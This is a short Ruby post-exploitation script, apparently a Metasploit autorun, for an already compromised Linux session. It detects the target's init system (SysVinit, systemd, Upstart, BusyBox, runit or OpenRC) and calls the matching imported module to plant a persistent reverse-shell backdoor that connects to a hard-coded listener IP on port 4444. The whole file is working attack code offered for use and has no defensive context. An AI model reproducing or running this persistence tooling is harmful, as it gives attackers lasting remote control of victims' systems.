require '/home/msf/msf-autorunscripts/init_detector'
require '/home/msf/msf-autorunscripts/busyboxx_backdoor_inittab'
require '/home/msf/msf-autorunscripts/openrc_backdoor_initd'
require '/home/msf/msf-autorunscripts/systemd_backdoor_systemctl'
require '/home/msf/msf-autorunscripts/sysvinit_backdoor_rc_local'
require '/home/msf/msf-autorunscripts/upstart_backdoor_conf'
require '/home/msf/msf-autorunscripts/runit_backdoor_sv'

fm        = client.framework
target_ip = client.session_host
sid       = client.sid

print("\n")
#SessionSanitizer.run(fm, target_ip, sid)
print("\n")
#ShellPromotion.run(fm, sid, target_ip, client)
print("\n")

init_type = InitDetector.detect(session)

lhost = "190.102.43.107"
lport = "4444"

print("\n")
if init_type == :sysvinit
    print_status("SysVynit was detected")
    RcLocalReverseShell.run(fm, sid, client,lhost,lport)
end

if init_type == :systemd
    print_status("Systemd was detected")
    SystemdReverseShell.run(fm, sid, client,lhost,lport)
end

if init_type == :upstart
    print_status("Upstart was detected")
    UpstartReverseShell.run(fm, sid, client,lhost,lport)
end

if init_type == :busybox
    print_status("Busybox was detected")
    BusyboxInittabReverseShell.run(fm, sid, client,lhost,lport)
end

if init_type == :runit
    print_status("RunIt was detected")
    RunitReverseShell.run(fm, sid, client,lhost,lport)
end

if init_type == :openrc
    print_status("OpenRC was detected")
    OpenrcReverseShell.run(fm, sid, client,lhost,lport)
end
